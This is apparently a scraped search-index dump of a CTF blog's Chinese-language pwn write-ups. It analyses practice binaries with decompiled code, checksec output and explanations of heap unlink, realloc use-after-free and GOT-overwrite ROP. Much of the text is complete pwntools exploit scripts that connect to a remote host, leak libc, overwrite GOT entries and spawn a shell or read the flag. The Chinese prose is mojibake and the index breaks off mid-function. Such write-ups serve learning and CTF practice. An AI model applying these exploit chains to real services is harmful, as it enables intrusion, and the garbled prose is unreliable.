ä¸ºæˆ‘ä»¬è¦ä¿®æ”¹chunk header,æ‰€ä»¥éœ€è¦æƒ³åŠæ³•æº¢å‡ºæˆ–UAFã€‚ ","date":"2021-01-17","objectID":"/heap-unlink/:2:0","series":null,"tags":["Pwn"],"title":"Heap Unlink","uri":"/heap-unlink/#æ–°çš„unlink"},{"categories":["Writeups"],"content":"Challenges_100-Week_2 Challenges Tricks æ”»é˜²ä¸–ç•Œ-4-ReeHY-main-100 ROP/unlink+double free ","date":"2021-01-16","objectID":"/challenges-100-week-2/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#challenges_100-week_2"},{"categories":["Writeups"],"content":"4-ReeHY-main-100","date":"2021-01-16","objectID":"/challenges-100-week-2/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#4-reehy-main-100"},{"categories":["Writeups"],"content":"checksec [*] '/home/niebelungen/Desktop/pwn/4-ReeHY-main-100/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-01-16","objectID":"/challenges-100-week-2/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#checksec"},{"categories":["Writeups"],"content":"IDA int __fastcall create(__int64 a1, __int64 a2) { int result; // eax char buf[128]; // [rsp+0h] [rbp-90h] BYREF void *dest; // [rsp+80h] [rbp-10h] int v5; // [rsp+88h] [rbp-8h] size_t nbytes; // [rsp+8Ch] [rbp-4h] result = chunk_num; if ( chunk_num \u003c= 4 ) { puts(\"Input size\"); result = ((__int64 (__fastcall *)(const char *, __int64))choice)(\"Input size\", a2); LODWORD(nbytes) = result; if ( result \u003c= 0x1000 ) { puts(\"Input cun\"); result = ((__int64 (__fastcall *)(const char *, __int64))choice)(\"Input cun\", a2); v5 = result; if ( result \u003c= 4 ) { dest = malloc((int)nbytes); puts(\"Input content\"); if ( (int)nbytes \u003e 112 ) { read(0, dest, (unsigned int)nbytes); } else { read(0, buf, (unsigned int)nbytes); memcpy(dest, buf, (int)nbytes); } *(_DWORD *)(size_t + 4LL * v5) = nbytes; *((_QWORD *)\u0026position + 2 * v5) = dest; signal[4 * v5] = 1; ++chunk_num; result = fflush(stdout); } } } return result; } __int64 dele() { __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts(\"Chose one to dele\"); result = choice(); v1 = result; if ( (int)result \u003c= 4 ) { free(*((void **)\u0026position + 2 * (int)result)); signal[4 * v1] = 0; puts(\"dele success!\"); result = (unsigned int)--chunk_num; } return result; } ","date":"2021-01-16","objectID":"/challenges-100-week-2/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#ida"},{"categories":["Writeups"],"content":"ROPé¦–å…ˆçœ‹ä½¿ç”¨å¸¸è§„ROPï¼Œåœ¨createå¤„ï¼Œifæ¡ä»¶å’Œreadå¾—nbytesäº§ç”Ÿæ˜æ˜¾çš„æº¢å‡ºã€‚ ","date":"2021-01-16","objectID":"/challenges-100-week-2/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#rop"},{"categories":["Writeups"],"content":"exp-ROP from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./pwn' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',34354) elf = ELF(binary,checksec=False) #libc=ELF('./ctflibc.so.6') pop_rdi=0x400da3 main_addr=0x400c8c p.sendlineafter('$ ','1234') p.sendlineafter('$ ','1') p.sendlineafter('Input size\\n','-1') p.sendlineafter('Input cun\\n','1') payload='a'*0x88+'\\x00'*0x8+'a'*0x8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main_addr) p.sendlineafter('Input content',payload) p.recv() puts_addr=u64(p.recv()[:6].ljust(8,'\\x00')) log.success('puts_addr:'+hex(puts_addr)) libc=LibcSearcher('puts',puts_addr) libc_base=puts_addr-libc.dump('puts') system=libc_base+libc.dump('system') bin_sh=libc_base+libc.dump('str_bin_sh') log.success('libc_base:'+hex(libc_base)) p.sendline('Niebelungen') p.sendlineafter('$ ','1') p.sendlineafter('Input size\\n','-1') p.sendlineafter('Input cun\\n','1') payload='a'*0x88+'\\x00'*0x8+'a'*0x8+p64(pop_rdi)+p64(bin_sh)+p64(system) p.sendlineafter('Input content',payload) p.interactive() ","date":"2021-01-16","objectID":"/challenges-100-week-2/:4:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#exp-rop"},{"categories":["Writeups"],"content":"unlink0x6020E0å¤„å‚¨å­˜ç€ç”³è¯·çš„å †çš„æŒ‡é’ˆå’ŒçŠ¶æ€ä¿¡æ¯ï¼Œç»è¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·åˆ°è¿™ä¸ªæ•°ç»„é™„è¿‘çš„chunkï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡unlinkæ¥ä¿®æ”¹è¿™ä¸ªæ•°ç»„çš„ä¿¡æ¯ï¼Œä½¿æŸä¸€æŒ‡é’ˆæŒ‡å‘gotè¡¨ï¼Œä»è€Œå¯¹gotè¡¨è¿›è¡Œä¿®æ”¹ã€‚ é¦–å…ˆç”³è¯·ä¸€ä¸ªchunkï¼Œç”¨æ¥å†™â€˜/bin/shâ€™ã€‚ç„¶åç”³è¯·ä¸‰ä¸ªsize\u003efastbinçš„chunk1ï¼Œchunk2ï¼Œchunk3ï¼Œå°†chunk2å’Œchunk3éƒ½freeæ‰ã€‚ä¹‹åç”³è¯·ä¸€ä¸ªsizeç­‰äºchunk2+chunk3ã€‚è¿™æ ·æˆ‘ä»¬å®é™…è·å¾—äº†chunk3å¤´éƒ¨çš„æ§åˆ¶æƒã€‚åœ¨chunk2çš„æ•°æ®åŸŸä¸­æ„é€ fake_chunkï¼Œä¿®æ”¹chunk3çš„å¤´éƒ¨è¿›è¡Œunlinkã€‚ unlinkåï¼š ==\u003e |0 | \u003c== ptr - 0x18 | | | | |ptr - 0x18 | \u003c== ptr è¿™æ—¶ä¿®æ”¹*pträ¸ºfree@got |padding | |padding | |padding | |free@got| \u003c== ptr æ­¤æ—¶ptræŒ‡å‘free@gotï¼Œå‘pträ¸­å†™æ•°æ®å°±æ˜¯ä¿®æ”¹free@got ","date":"2021-01-16","objectID":"/challenges-100-week-2/:5:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#unlink"},{"categories":["Writeups"],"content":"exp-unlink from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./pwn' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',31890) elf = ELF(binary,checksec=False) atoi_got=elf.got['atoi'] puts_plt = elf.plt['puts'] free_got = elf.got['free'] puts_got = elf.got['puts'] heap = 0x602100 def create(size,index,content): p.sendlineafter('$ ','1') p.sendlineafter('Input size\\n',str(size)) p.sendlineafter('Input cun\\n',str(index)) p.sendafter('Input content\\n',content) def delete(index): p.sendlineafter('$ ','2') p.sendlineafter('Chose one to dele\\n',str(index)) def edit(index,content): p.sendlineafter('$ ','3') p.sendlineafter('Chose one to edit\\n',str(index)) p.sendafter('Input the content\\n',content) p.sendlineafter('$ ','Niebelungen') create(0x200,0,'/bin/sh\\x00') create(0x200,1,'first') create(0x200,2,'second') create(0x200,3,'third') #gdb.attach(p) delete(3) delete(2) payload=p64(0)+p64(0x201)+p64(heap-0x18)+p64(heap-0x10)+'a'*(0x200-0x20)+p64(0x200)+p64(0x200) create(0x400,2,payload) #unlink delete(3) payload=0x18*'1'+p64(free_got)+p64(1)+p64(atoi_got) edit(2,payload) edit(2,p64(puts_plt)) delete(3) atoi_addr=u64(p.recvn(6).ljust(8,'\\x00')) libc=LibcSearcher('atoi',atoi_addr) offset=atoi_addr-libc.dump('atoi') system_addr=offset+libc.dump('system') edit(2,p64(system_addr)) delete(0) p.interactive() ","date":"2021-01-16","objectID":"/challenges-100-week-2/:6:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#exp-unlink"},{"categories":["Writeups"],"content":"Challenges_100-Week_1 Challenges Tricks [æ”»é˜²ä¸–ç•Œ-Recho](# recho) Hack got+ROP+experience [æ”»é˜²ä¸–ç•Œ-supermarket](# supermarket) UAF+Hack got [æ”»é˜²ä¸–ç•Œ-hacknote](# hacknote) UAF æ–°çš„ä¸€å¹´ç™¾é¢˜æ–©çš„flagï¼Œå¼€å§‹æ‹”æ——äº†ã€‚ä¸çŸ¥é“è‡ªå·±èƒ½ä¸èƒ½åšæŒä¸‹å»ã€‚æ€»ä¹‹ï¼Œå¤§è‡´çš„å½¢å¼å°±æ˜¯è¿™æ ·ï¼Œæˆ‘ä¼šæŠŠå¤§çº²æ”¾åˆ°å¼€å¤´æ–¹ä¾¿è¿›è¡Œè·³è½¬ã€‚ Week_1ï¼Œä¸¤é“heapï¼Œæœ¬åœ°éƒ½æ‰“ä¸é€šè¿œç¨‹å°±è¡Œã€‚çŒœæµ‹æ˜¯ç¯å¢ƒé—®é¢˜ã€‚ ","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-id-jumpchallenges_100-week_1span"},{"categories":["Writeups"],"content":"Recho","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-id-rechorechospan"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/recho/recho' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#checksec"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { char nptr[16]; // [rsp+0h] [rbp-40h] BYREF char buf[40]; // [rsp+10h] [rbp-30h] BYREF int v6; // [rsp+38h] [rbp-8h] int v7; // [rsp+3Ch] [rbp-4h] Init(argc, argv, envp); write(1, \"Welcome to Recho server!\\n\", 0x19uLL); while ( read(0, nptr, 0x10uLL) \u003e 0 ) { v7 = atoi(nptr); if ( v7 \u003c= 15 ) v7 = 16; v6 = read(0, buf, v7); buf[v6] = 0; printf(\"%s\", buf); } return 0; } çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªç®€å•çš„ç¨‹åºï¼Œå¯ä»¥æº¢å‡ºä»»æ„å­—èŠ‚é•¿åº¦ã€‚ä½†æ˜¯æº¢å‡ºç‚¹åœ¨whileå¾ªç¯ä¸­ï¼Œè¿™æ ·å°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è·³å‡ºå¾ªç¯ï¼Ÿ pwntoolsæœ‰ä¸€ä¸ªshutdownå¯ä»¥ç”¨æ¥å…³é—­æµï¼Œä½†æ˜¯åœ¨å…³é—­æµä¹‹åï¼Œç¨‹åºå°±åœæ­¢äº†è¿è¡Œï¼Œå°±åƒä½ åœ¨ç»ˆç«¯ä½¿ç”¨äº†ctrl+Dã€‚ä¸€æ¬¡æ€§è¦å®Œæˆæ‰€æœ‰æ“ä½œï¼Œé‚£ä¹ˆæš´éœ²åœ°å€çš„æ–¹å¼è‚¯å®šä¸èƒ½å®Œæˆï¼Œå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨(syscall)ã€‚å¯¹äºæœ‰äº›ç³»ç»Ÿ,system ä¹Ÿå¯ä»¥ç”¨ç³»ç»Ÿè°ƒç”¨,è€Œå¯¹äºæœ‰äº›ç³»ç»Ÿåˆ™ä¸è¡Œï¼Œå› æ­¤ï¼Œæˆ‘ä»¬è¿™é‡Œä¸å† geshellï¼Œæˆ‘ä»¬ç›´æ¥è¯»å– flagï¼Œç„¶åæ‰“å°å‡ºæ¥ã€‚ æ€è·¯ï¼šopenæ‰“å¼€æ–‡ä»¶ï¼Œç”¨readè¯»å–flagï¼Œä½¿ç”¨printfæ‰“å°å‡ºæ¥ã€‚ open(â€œflagâ€,â€œrâ€) é€šè¿‡ä¿®æ”¹gotè¡¨çš„æ–¹å¼è°ƒç”¨openï¼Œ .text:000000000040070D align 2 .text:000000000040070E dw 0C307h è¿™é‡Œæœ‰ä¸€ä¸ªè¿™æ ·çš„æŒ‡ä»¤ï¼Œå°†å®ƒundefineï¼Œç„¶åcodeï¼Œå°±å˜æˆäº†è¿™æ · .text:000000000040070D add [rdi], al .text:000000000040070F retn å¾ˆç¥å¥‡ï¼Œå¤§å¸ˆå‚…åªè¯´æ˜¯ç»éªŒï¼Œå…·ä½“çš„åŸç†ä¹Ÿä¸å¤ªæ¸…æ¥š~~è®°ä¸‹æ¥å°±å¥½ã€‚ã€‚ã€‚ addå‘½ä»¤å°†rdiåœ°å€å¯¹åº”çš„å€¼åŠ ä¸Šalæ‰€ä¿å­˜çš„å€¼ã€‚é‚£ä¹ˆï¼Œå¦‚æœ rdi é‡Œå­˜å‚¨ç€ alarm çš„ GOT è¡¨åœ°å€ï¼Œ é‚£ä¹ˆ add [rdi],al å°±æ˜¯æŠŠ GOT è¡¨é‡ŒæŒ‡å‘çš„åœ°å€å‘ååç§» alï¼Œç”±äº alarm å‡½æ•°å‘ååç§» 0x5 ä¸ªå­— èŠ‚å¤„è°ƒç”¨äº† syscallï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬çš„ al ä¸º 0x5ï¼Œé‚£ä¹ˆï¼Œadd æŒ‡ä»¤æ‰§è¡Œåï¼Œæˆ‘ä»¬çš„ alarm å‡½ æ•° GOT è¡¨é‡Œçš„åœ°å€å°±æŒ‡å‘äº† syscall çš„è°ƒç”¨å¤„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è°ƒç”¨ alarm ä¹Ÿå°±æ˜¯è°ƒç”¨ syscallï¼Œæˆ‘ ä»¬åªéœ€åœ¨ä¹‹å‰ä¼ å…¥ eaxï¼ˆç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œå°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬éœ€è¦çš„ç³»ç»Ÿè°ƒç”¨ã€‚ flagå­—ç¬¦ä¸²å¯ä»¥åœ¨ç¨‹åºç§æ‰¾åˆ°ï¼Œrå¯¹åº”çš„å­—ç¬¦æ ‡è¯†ç¬¦ä¸º0 ï¼ˆè¿™ä¸ªé¢˜ä¼¼ä¹åº”è¯¥ç»™ä¸€ä¸‹libcçš„ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ã€‚ã€‚ï¼‰ #hack got payload='a'*0x38+p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(5)+p64(add_rdi) #open flag r payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(alarm_plt) read(flag, bss, 100) æ‰“å¼€ä¹‹åå°†flagè¯»åˆ°ç¨‹åºçš„bssæ®µï¼Œè°ƒç”¨readå‡½æ•°ã€‚æ‰“å¼€çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶æ ‡è¯†ç¬¦ä¸º3ã€‚ #read(3,bss,100) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(0)+p64(pop_rdx)+p64(100)+p64(read_plt) printf(flag) ä¸ç”¨æ§åˆ¶æ‰€æœ‰çš„å‚æ•°ï¼Œç›´æ¥ä¼ å…¥flagåœ°å€å°±è¡Œã€‚ #printf(flag) payload+=p64(pop_rdi)+p64(bss)+p64(printf_plt) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#ida"},{"categories":["Writeups"],"content":"expå®Œæ•´expå¦‚ä¸‹ï¼š from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 #gdb.attach(p) if local: p=process('./recho') elf = ELF('./recho') else: p=remote('220.249.52.133',43279) elf = ELF('./recho') alarm_got=elf.got['alarm'] alarm_plt=elf.plt['alarm'] read_plt=elf.plt['read'] printf_plt=elf.plt['printf'] pop_rdi=0x4008a3 pop_rsi=0x4008a1 pop_rax=0x4006fc add_rdi=0x40070d pop_rdx=0x4006fe main=0x0400791 flag=0x601058 bss=0x601070 #gdb.attach(p) p.recvuntil('Welcome to Recho server!\\n') p.sendline(str(0x200)) #hack got payload='a'*0x38+p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(5)+p64(add_rdi) #open flag r payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(alarm_plt) #read(3,bss,100) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(0)+p64(pop_rdx)+p64(100)+p64(read_plt) #printf(flag) payload+=p64(pop_rdi)+p64(bss)+p64(printf_plt) payload=payload.ljust(0x200,'\\x00') p.sendline(payload) p.shutdown('send') p.interactive() ","date":"2021-01-10","objectID":"/challenges-100-week-1/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#exp"},{"categories":["Writeups"],"content":"supermarket","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-id-supermarketsupermarketspan"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/supermarket/supermarket' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) è¿™ä¸ªheapç«Ÿç„¶æ²¡ä¿æŠ¤å…¨å¼€ ","date":"2021-01-10","objectID":"/challenges-100-week-1/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#checksec-1"},{"categories":["Writeups"],"content":"ida //main void sub_8048FC1() { while ( 1 ) { menu(); printf(\"your choice\u003e\u003e \"); switch ( sub_804882E() ) { case 1: add(); break; case 2: del(); break; case 3: list(); break; case 4: change_price(); break; case 5: change_descrip(); break; case 6: exit(0); return; default: puts(\"invalid choice\"); break; } } } //add int sub_80488DD() { char *v1; // ebx char *v2; // ebx char src[16]; // [esp+4h] [ebp-24h] BYREF int v4; // [esp+14h] [ebp-14h] int v5; // [esp+18h] [ebp-10h] int i; // [esp+1Ch] [ebp-Ch] for ( i = 0; i \u003c= 15 \u0026\u0026 (\u0026s2)[i]; ++i ) ; if ( i \u003e 15 ) return puts(\"no more space\"); printf(\"name:\"); reads((int)src, 16); v5 = sub_8048D45(src); if ( v5 != -1 ) return puts(\"name exist\"); v5 = sub_8048D95(); if ( v5 == -1 ) return puts(\"no more space\"); (\u0026s2)[v5] = (char *)malloc(0x1Cu); strcpy((\u0026s2)[v5], src); printf(\"name:%s\\n\", src); v4 = 0; printf(\"price:\"); v4 = sub_804882E(); printf(\"price:%d\\n\", v4); if ( v4 \u003e 0 \u0026\u0026 v4 \u003c= 999 ) *((_DWORD *)(\u0026s2)[v5] + 4) = v4; *((_DWORD *)(\u0026s2)[v5] + 5) = 0; while ( *((int *)(\u0026s2)[v5] + 5) \u003c= 0 || *((int *)(\u0026s2)[v5] + 5) \u003e 256 ) { printf(\"descrip_size:\"); v1 = (\u0026s2)[v5]; *((_DWORD *)v1 + 5) = sub_804882E(); } printf(\"descrip_size:%d\\n\", *((_DWORD *)(\u0026s2)[v5] + 5)); v2 = (\u0026s2)[v5]; *((_DWORD *)v2 + 6) = malloc(*((_DWORD *)v2 + 5)); printf(\"description:\"); return reads(*((_DWORD *)(\u0026s2)[v5] + 6), *((_DWORD *)(\u0026s2)[v5] + 5)); } int change_descrip() { int v1; // [esp+8h] [ebp-10h] int size; // [esp+Ch] [ebp-Ch] v1 = sub_8048DC8(); if ( v1 == -1 ) return puts(\"not exist\"); for ( size = 0; size \u003c= 0 || size \u003e 256; size = sub_804882E() ) printf(\"descrip_size:\"); if ( *((_DWORD *)(\u0026s2)[v1] + 5) != size ) realloc(*((void **)(\u0026s2)[v1] + 6), size); //æ¼æ´å¤„ printf(\"description:\"); return reads(*((_DWORD *)(\u0026s2)[v1] + 6), *((_DWORD *)(\u0026s2)[v1] + 5)); } åˆ†ææ•´ä¸ªç¨‹åºï¼Œå•†å“çš„ç»“æ„å¤§è‡´ä¸ºï¼š struct{ char name[16]; int price; int descrip_size; char *descrip; } s2å¤„æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„å¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œä½†æ˜¯è¿™ä¸ªç»“æ„ä½“å°±ä¸å¤ªå®¹æ˜“ã€‚æˆ‘ä¸æ˜ç™½nameçš„å­—èŠ‚å¤§å°åº”è¯¥æ˜¯16ï¼Œä¼ªcä»£ç å´æ˜¾ç¤ºçš„+4ã€+5ï¼Ÿæ‰€ä»¥æˆ‘å»çœ‹äº†æ±‡ç¼–ä»£ç ï¼Œè¿™æ‰ç†æ¸…äº†ç»“æ„ä½“çš„ç»“æ„ã€‚ delå‡½æ•°ä¸­ï¼Œå°†ç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘NULLï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚ åˆ©ç”¨ç‚¹åœ¨change_descripä¸­ï¼Œè¿™é‡Œè¦ä»‹ç»reallocçš„å®ç°åŸç†ï¼š 1.å¯¹ptrè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœpträ¸ºNULLï¼Œåˆ™å‡½æ•°ç›¸å½“äºmalloc(new_size),è¯•ç€åˆ†é…ä¸€å—å¤§å°ä¸ºnew_sizeçš„å†…å­˜ï¼Œå¦‚æœæˆåŠŸå°†åœ°å€è¿”å›ï¼Œå¦åˆ™è¿”å›NULLã€‚å¦‚æœpträ¸ä¸ºNULLï¼Œåˆ™è¿›å…¥2 2.æŸ¥çœ‹ptræ˜¯ä¸æ˜¯åœ¨å †ä¸­ï¼Œå¦‚æœä¸æ˜¯çš„è¯ä¼šè·‘å‡ºå¼‚å¸¸é”™è¯¯ï¼Œä¼šå‘ç”Ÿrealloc invalid pointerã€‚å¦‚æœptråœ¨å †ä¸­ï¼Œåˆ™æŸ¥çœ‹new_sizeå¤§å°ï¼Œå¦‚æœnew_sizeå¤§å°ä¸º0ï¼Œåˆ™ç›¸å½“äºfree(ptr)ï¼Œè®²ptræŒ‡é’ˆé‡Šæ”¾ï¼Œè¿”å›NULLï¼Œå¦‚æœnew_sizeå°äºåŸå¤§å°ï¼Œåˆ™pträ¸­çš„æ•°æ®å¯èƒ½ä¼šä¸¢å¤±ï¼Œåªæœ‰new_sizeå¤§å°çš„æ•°æ®ä¼šä¿å­˜ï¼ˆè¿™é‡Œå¾ˆé‡è¦ï¼‰ï¼Œå¦‚æœsizeç­‰äºåŸå¤§å°ï¼Œç­‰äºå•¥éƒ½æ²¡åšï¼Œå¦‚æœsizeå¤§äºåŸå¤§å°ï¼Œåˆ™çœ‹ptræ‰€åœ¨çš„ä½ç½®è¿˜æœ‰æ²¡æœ‰è¶³å¤Ÿçš„è¿ç»­å†…å­˜ç©ºé—´ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œåˆ†é…æ›´å¤šçš„ç©ºé—´ï¼Œè¿”å›çš„åœ°å€å’Œptrç›¸åŒï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œåœ¨æ›´å¤§çš„ç©ºé—´å†…æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°sizeå¤§å°çš„ç©ºé—´ï¼Œå°†æ—§çš„å†…å®¹æ‹·è´åˆ°æ–°çš„å†…å­˜ä¸­ï¼ŒæŠŠæ—§çš„å†…å­˜é‡Šæ”¾æ‰ï¼Œåˆ™è¿”å›æ–°åœ°å€ï¼Œå¦åˆ™è¿”å›NULLã€‚ å°±æ˜¯è¿™ä¸ªæŠŠæ—§çš„å†…å­˜é‡Šæ”¾ï¼Œè€Œæ–°å†…å­˜åœ°å€çš„æŒ‡é’ˆå¹¶æ²¡æœ‰è¿”å›å–ä»£æ—§åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªè¢«é‡Šæ”¾çš„å†…å­˜ç©ºé—´ã€‚è¿™æ—¶å†æ¬¡ç”³è¯·ä¸€å—å†…å­˜å°±åˆæŠŠå®ƒæ‹¿åˆ°äº†æ‰‹é‡Œã€‚è¿™æ ·æˆ‘ä»¬æœ‰äº†æŒ‡å‘åŒä¸€å†…å­˜çš„ä¸¤ä¸ªæŒ‡é’ˆã€‚UAFæ¼æ´ï¼ æ¥ä¸‹æ¥å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œåœ¨ç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªdescripçš„æŒ‡é’ˆï¼Œä¿®æ”¹ä½¿å…¶æŒ‡å‘atoiçš„gotè¡¨ï¼Œæ³„éœ²libcåœ°å€ã€‚ç„¶åå°†å…¶ä¿®æ”¹ä¸ºsystemåœ°å€ï¼Œä¼ å…¥å‚æ•°â€œ/bin/shâ€ã€‚ ç”³è¯·ç¬¬ä¸€ä¸ªnode_1ï¼Œdescription_size\u003efastbinï¼Œç¬¬äºŒä¸ªnode_2ï¼Œé˜²æ­¢chunkä¸top chunkåˆå¹¶ï¼Œsizeéšæ„ï¼› åˆ©ç”¨reallocï¼Œfreeç¬¬ä¸€ä¸ªchunk_1ï¼Œä¸è¦å†™å…¥ä¸œè¥¿ï¼Œå¦åˆ™ä¼šç ´åchunkç»“æ„ï¼Œå¯¼è‡´ä¸‹é¢çš„mallocå¤±è´¥ã€‚ ç”³è¯·node_3ï¼Œç”±äºæ­¥éª¤2ä¸­çš„node_1-\u003edescripè¢«freeï¼Œæ‰€ä»¥åœ¨unsorted binä¸­ã€‚chunkè¢«åˆ‡å‰²ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†ç”¨æ¥å­˜æ”¾ç»“æ„ä½“ï¼Œä¸€éƒ¨åˆ†ç”¨æ¥å­˜æ”¾descripã€‚ ä¿®æ”¹node_1çš„descripï¼Œå³æ”¹å˜node_3çš„ç»“æ„ï¼Œä½¿å…¶descripæŒ‡å‘atoi_gotã€‚ åˆ©ç”¨listæ³„éœ²libcåœ°å€ã€‚ ä¿®æ”¹descripæŒ‡å‘systemï¼Œé€‰é¡¹è¾“å…¥â€˜/bin/shâ€™ã€‚get shellï¼ ","date":"2021-01-10","objectID":"/challenges-100-week-1/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./supermarket' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',47082) elf = ELF(binary,checksec=False) libc=ELF('./libc.so.6') atoi_got=elf.got[\"atoi\"] def create(name,size,context): p.sendlineafter('your choice\u003e\u003e ','1') p.sendlineafter('name:',str(name)) p.sendlineafter('price:','99') p.sendlineafter('descrip_size:',str(size)) p.sendlineafter('description:',context) def dele(name,size,context): p.sendlineafter('your choice\u003e\u003e ','5') p.sendlineafter('name:',str(name)) p.sendlineafter('descrip_size:',str(size)) p.sendlineafter('description:',context) create(1,0x80,'ppp') create(2,0x20,'aaa') dele(1,0x90,'') create(3,0x20,'bbb') payload='3'.ljust(16,'\\x00')+p32(99)+p32(0x20)+p32(atoi_got) dele(1,0x80,payload) p.sendlineafter('your choice\u003e\u003e ','3') p.recvuntil('3: price.99, des.') atoi_addr=u32(p.recvuntil('\\n').split('\\n')[0].ljust(4,'\\x00')) libcbase=atoi_addr-libc.symbols['atoi'] system=libcbase+libc.symbols['system'] dele(3,0x20,p32(system)) p.sendline('/bin/sh\\x00') p.interactive() ","date":"2021-01-10","objectID":"/challenges-100-week-1/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#exp-1"},{"categories":["Writeups"],"content":"hacknote","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-idhacknotehacknotespan"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/hacknote/hacknote' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#checksec-2"},{"categories":["Writeups"],"content":"ida void __cdecl __noreturn main() { int v0; // eax char buf[4]; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); while ( 1 ) { while ( 1 ) { menu(); read(0, buf, 4u); v0 = atoi(buf); if ( v0 != 2 ) break; 